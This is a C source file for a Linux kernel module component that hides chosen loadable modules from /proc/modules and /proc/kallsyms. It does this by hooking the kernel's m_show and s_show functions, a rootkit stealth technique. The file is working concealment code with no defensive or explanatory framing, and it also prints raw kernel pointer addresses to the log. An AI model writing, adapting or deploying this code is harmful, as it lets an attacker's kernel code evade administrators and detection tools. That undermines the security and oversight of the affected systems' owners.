#include <linux/module.h>
#include <linux/kallsyms.h>
#include <linux/list.h>
#include <linux/string.h>
#include <linux/seq_file.h>
#include <linux/slab.h>

#include "hook.h"
#include "hide.h"

LIST_HEAD(hidden_modules);

struct hidden_module {
	struct list_head list;

	char module_name[MODULE_NAME_LEN];
};

struct seq_file;
static int (*m_show)(struct seq_file *m, void *p);
static int (*s_show)(struct seq_file *m, void *p);

static int (*orig_m_show)(struct seq_file *m, void *p);
static int (*orig_s_show)(struct seq_file *m, void *p);

static int new_m_show(struct seq_file *m, void *p)
{
	struct module *mod = list_entry(p, struct module, list);
	struct list_head *ptr;
	struct hidden_module *hm;

	list_for_each(ptr, &hidden_modules) {
		hm = list_entry(ptr, struct hidden_module, list);
		if (strcmp(hm->module_name, mod->name) == 0) {
			return SEQ_SKIP;
		}
	}

	return orig_m_show(m, p);
}

struct kallsym_iter {
	loff_t pos;
	unsigned long value;
	unsigned int nameoff; /* If iterating in core kernel symbols. */
	char type;
	char name[KSYM_NAME_LEN];
	char module_name[MODULE_NAME_LEN];
	int exported;
};

static int new_s_show(struct seq_file *m, void *p)
{
	struct kallsym_iter *iter = m->private;
	struct list_head *ptr;
	struct hidden_module *hm;

	if (iter->module_name[0] == '\0') {
		return orig_s_show(m, p);
	}

	list_for_each(ptr, &hidden_modules) {
		hm = list_entry(ptr, struct hidden_module, list);
		if (strcmp(hm->module_name, iter->module_name) == 0) {
			return SEQ_SKIP;
		}
	}

	return orig_s_show(m, p);
}

static int show_functions_hooked;

static int hook_show_functions(void)
{
	void *orig_func;

	if (show_functions_hooked) {
		return 0;
	}

	orig_m_show = make_orig_func((void *)m_show);
	if (orig_m_show == NULL) {
		return -1;
	}
	orig_func = replace_function((ulong)m_show, (ulong)new_m_show);
	if (orig_func == NULL) {
		unmake_orig_func(orig_m_show);
		return -1;
	}

	orig_s_show = make_orig_func((void *)s_show);
	if (orig_s_show == NULL) {
		unreplace_function((ulong)m_show);
		unmake_orig_func(orig_m_show);
		return -1;
	}
	orig_func = replace_function((ulong)s_show, (ulong)new_s_show);
	if (orig_func == NULL) {
		unreplace_function((ulong)m_show);
		unmake_orig_func(orig_m_show);
		unmake_orig_func(orig_s_show);
		return -1;
	}

	show_functions_hooked = 1;

	return 0;
}

static void recover_show_functions(void)
{
	if (!show_functions_hooked) {
		return;
	}

	unreplace_function((ulong)m_show);
	unreplace_function((ulong)s_show);

	unmake_orig_func(orig_m_show);
	unmake_orig_func(orig_s_show);

	show_functions_hooked = 0;
}

int hide_module(const char *name)
{
	int ret;
	struct hidden_module *hm;

	hm = kzalloc(sizeof (*hm), GFP_KERNEL);
	if (hm == NULL) {
		printk("kzalloc failed.\n");
		return -1;
	}
	strncpy(hm->module_name, name, MODULE_NAME_LEN);

	ret = hook_show_functions();
	if (ret < 0) {
		kfree(hm);
		return -1;
	}

	list_add_tail(&hm->list, &hidden_modules);

	return 0;
}

static struct hidden_module *find_hidden_module(const char *name)
{
	struct list_head *ptr;
	struct hidden_module *hm;

	list_for_each(ptr, &hidden_modules) {
		hm = list_entry(ptr, struct hidden_module, list);
		if (strcmp(hm->module_name, name) == 0) {
			return hm;
		}
	}

	return NULL;
}

void unhide_module(const char *name)
{
	struct hidden_module *hm;

	hm = find_hidden_module(name);
	if (hm == NULL) {
		return;
	}
	list_del(&hm->list);
	kfree(hm);

	if (list_empty(&hidden_modules)) {
		recover_show_functions();
	}
}

int hide_init(void)
{
	void **modules_op;
	void **kallsyms_op;

	modules_op = (void *)kallsyms_lookup_name("modules_op");
	if (modules_op == NULL) {
		printk(KERN_INFO "kallsyms_lookup_name failed\n");
		return -1;
	}
	printk("modules_op:\n");
	printk("%px\n", modules_op[0]);
	printk("%px\n", modules_op[1]);
	printk("%px\n", modules_op[2]);
	printk("%px\n", modules_op[3]);

	m_show = modules_op[3];

	kallsyms_op = (void *)kallsyms_lookup_name("kallsyms_op");
	if (kallsyms_op == NULL) {
		printk(KERN_INFO "kallsyms_lookup_name failed\n");
		return -1;
	}
	printk("kallsyms_op:\n");
	printk("%px\n", kallsyms_op[0]);
	printk("%px\n", kallsyms_op[1]);
	printk("%px\n", kallsyms_op[2]);
	printk("%px\n", kallsyms_op[3]);

	s_show = kallsyms_op[3];

	return 0;
}

void hide_exit(void)
{
	recover_show_functions();
}
